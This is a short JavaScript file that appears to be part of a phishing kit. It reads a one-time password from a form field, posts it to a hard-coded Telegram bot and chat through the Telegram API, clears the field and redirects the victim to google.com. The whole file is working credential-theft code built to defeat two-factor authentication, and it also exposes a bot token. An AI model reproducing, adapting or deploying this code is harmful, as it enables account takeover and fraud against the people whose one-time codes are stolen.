//bot token
var telegram_bot_id = "6359450538:AAEU4nQLP2AofQq6-MXfj40ULxgr0aJnRRE";
//chat id
var chat_id = -4034812161;
var OTP;
var ready = function () {
    OTP = document.getElementById("Rectangle_2").value;

    message = "OTP: " + OTP ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("Rectangle_2").value = "";

    window.location.href = "https://www.google.com/";

    return false;
};
